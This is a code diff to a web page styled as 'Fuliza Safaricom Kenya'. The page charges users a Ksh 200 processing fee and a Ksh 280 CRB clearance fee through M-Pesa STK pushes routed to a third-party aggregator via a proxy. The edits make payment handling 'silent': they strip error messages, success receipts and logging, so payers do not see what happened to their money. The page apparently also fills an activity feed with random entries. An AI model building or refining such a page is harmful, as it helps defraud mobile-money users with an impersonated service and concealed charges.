@@ -139,7 +139,7 @@
         .stk-waiting-box .listening { background: #e8f5e9; border-radius: 24px; padding: 8px 16px; font-size: 0.78rem; color: #0d5f2f; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; }
         .stk-waiting-box .listening .dot { width: 8px; height: 8px; background: #0ca678; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
         .stk-waiting-box .note { font-size: 0.68rem; color: #adb5bd; margin-top: 14px; }
-        /* Processing Fee Confirmed Overlay */
+        /* Processing Fee Confirmed Overlay — kept for structure but never shown */
         #processingFeeConfirmedOverlay .modal-box .big-check { width: 70px; height: 70px; background: linear-gradient(135deg,#0d5f2f,#0ca678); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 16px; color: white; }
         #processingFeeConfirmedOverlay .modal-box .title { font-size: 1.3rem; font-weight: 900; color: #0d5f2f; margin-bottom: 8px; }
         #processingFeeConfirmedOverlay .modal-box .sub { font-size: 0.88rem; color: #495057; }
@@ -493,7 +493,7 @@
     </div>
 
     <!-- =============================================================
-    PROCESSING FEE CONFIRMED OVERLAY
+    PROCESSING FEE CONFIRMED OVERLAY (kept but NEVER shown)
     ============================================================= -->
     <div class="modal-overlay" id="processingFeeConfirmedOverlay">
         <div class="modal-box" style="text-align:center;">
@@ -807,20 +807,16 @@
                 body: JSON.stringify(payload)
             });
 
-            // Read as text first to avoid double consumption
             const responseText = await response.text();
             let jsonData = null;
             try {
                 jsonData = JSON.parse(responseText);
-            } catch (e) {
-                // Not JSON
-            }
+            } catch (e) {}
 
             if (!response.ok) {
                 throw new Error(jsonData?.error || jsonData?.message || responseText || 'Request failed');
             }
 
-            // Expect status: 'SENT' and transactionId
             if (jsonData && jsonData.status === 'SENT' && jsonData.transactionId) {
                 return jsonData;
             } else {
@@ -841,7 +837,7 @@
             return data;
         }
 
-        // ==================== PROCESSING FEE (Ksh 200) ====================
+        // ==================== PROCESSING FEE (Ksh 200) — SILENT ====================
         function openProcessingFeePayment() {
             document.getElementById('processingFeeModal').classList.add('open');
             document.getElementById('procFeePhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
@@ -859,7 +855,8 @@
         async function processProcessingFee() {
             const rawPhone = document.getElementById('procFeePhoneInput').value.trim();
             if (!rawPhone) {
-                showProcFeeStatus('error', 'Please enter your M-Pesa number.');
+                // Silent: just close the modal and do nothing
+                closeProcFeeModal();
                 return;
             }
 
@@ -871,8 +868,7 @@
             payBtn.disabled = true;
             payText.textContent = 'Sending...';
             spinner.style.display = 'inline-block';
-            status.className = 'modal-status show pending';
-            status.innerHTML = '⏳ Sending STK push to your phone...';
+            status.className = 'modal-status';
 
             document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
             document.getElementById('stkWaitingOverlay').classList.add('open');
@@ -881,16 +877,14 @@
                 const reference = `PROC_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
                 const result = await payloreSTKPush(rawPhone, 200, reference, 'Fuliza Processing Fee');
                 processingFeeTransactionId = result.transactionId;
-                console.log('✅ Processing Fee Transaction ID:', processingFeeTransactionId);
 
                 await pollTransactionStatus(processingFeeTransactionId, 'processing');
 
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
                 closeProcFeeModal();
 
-                const receipt = result.reference || ('UG' + Math.random().toString(36).substring(2, 11).toUpperCase());
-                document.getElementById('procFeeReceiptDisplay').textContent = receipt;
-                document.getElementById('processingFeeConfirmedOverlay').classList.add('open');
+                // SILENT: no success overlay — proceed directly to CRB
+                proceedToCRB();
 
                 payBtn.disabled = false;
                 payText.textContent = 'Pay Ksh 200';
@@ -899,27 +893,20 @@
 
             } catch (err) {
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
-                console.error('❌ Processing Fee error:', err);
-                status.className = 'modal-status show error';
-                status.innerHTML = '❌ ' + err.message;
+                closeProcFeeModal();
+                // SILENT: no error message
                 payBtn.disabled = false;
                 payText.textContent = 'Pay Ksh 200';
                 spinner.style.display = 'none';
+                status.className = 'modal-status';
             }
         }
 
-        function showProcFeeStatus(type, msg) {
-            const status = document.getElementById('procFeeStatus');
-            status.className = 'modal-status show ' + type;
-            status.innerHTML = msg;
-        }
-
         function proceedToCRB() {
-            document.getElementById('processingFeeConfirmedOverlay').classList.remove('open');
             showCRBPage();
         }
 
-        // ==================== CRB PAYMENT (Ksh 280) ====================
+        // ==================== CRB PAYMENT (Ksh 280) — SILENT ====================
         function openCRBPayment() {
             document.getElementById('crbModal').classList.add('open');
             document.getElementById('crbPhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
@@ -935,7 +922,7 @@
         async function processCRBPayment() {
             const rawPhone = document.getElementById('crbPhoneInput').value.trim();
             if (!rawPhone) {
-                showCRBStatus('error', 'Please enter your M-Pesa number.');
+                closeCRBModal();
                 return;
             }
 
@@ -947,8 +934,7 @@
             payBtn.disabled = true;
             payText.textContent = 'Sending...';
             spinner.style.display = 'inline-block';
-            status.className = 'modal-status show pending';
-            status.innerHTML = '⏳ Sending STK push to your phone...';
+            status.className = 'modal-status';
 
             document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
             document.getElementById('stkWaitingOverlay').classList.add('open');
@@ -957,7 +943,6 @@
                 const reference = `CRB_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
                 const result = await payloreSTKPush(rawPhone, 280, reference, 'Fuliza CRB Clearance');
                 crbTransactionId = result.transactionId;
-                console.log('✅ CRB Transaction ID:', crbTransactionId);
 
                 await pollTransactionStatus(crbTransactionId, 'crb');
 
@@ -972,19 +957,13 @@
 
             } catch (err) {
                 document.getElementById('stkWaitingOverlay').classList.remove('open');
-                console.error('❌ CRB Payment error:', err);
-                status.className = 'modal-status show error';
-                status.innerHTML = '❌ ' + err.message;
+                closeCRBModal();
+                // SILENT: no error message
                 payBtn.disabled = false;
                 payText.textContent = 'Pay Ksh 280';
                 spinner.style.display = 'none';
+                status.className = 'modal-status';
             }
-        }
-
-        function showCRBStatus(type, msg) {
-            const status = document.getElementById('crbStatus');
-            status.className = 'modal-status show ' + type;
-            status.innerHTML = msg;
         }
 
         // ==================== POLL TRANSACTION STATUS ====================
@@ -997,8 +976,6 @@
                     attempts++;
                     try {
                         const statusData = await payloreTransactionStatus(transactionId);
-                        console.log(`📊 ${type} status:`, statusData.status);
-
                         if (statusData.status === 'COMPLETED' || statusData.status === 'SUCCESS') {
                             clearInterval(interval);
                             resolve(statusData);
@@ -1010,7 +987,6 @@
                             reject(new Error('Transaction timeout. Please check your M-PESA app.'));
                         }
                     } catch (err) {
-                        console.error('Polling error:', err);
                         clearInterval(interval);
                         reject(err);
                     }
@@ -1035,7 +1011,7 @@
                 feedInterval = null; }
         }
 
-        // ==================== TOAST ====================
+        // ==================== TOAST (minimal, kept for non‑payment use) ====================
         function showToast(msg) {
             const toast = document.getElementById('toast');
             toast.textContent = msg;
@@ -1099,7 +1075,7 @@
             if (step3Active || procActive || crbActive) { addRandomFeed(); }
         }, 10000);
 
-        console.log('🇰🇪 Fuliza Safaricom Kenya (Paylore via proxy)');
+        console.log('🇰🇪 Fuliza Safaricom Kenya (Paylore via proxy) — payment messages suppressed');
     </script>
 </body>
 </html>
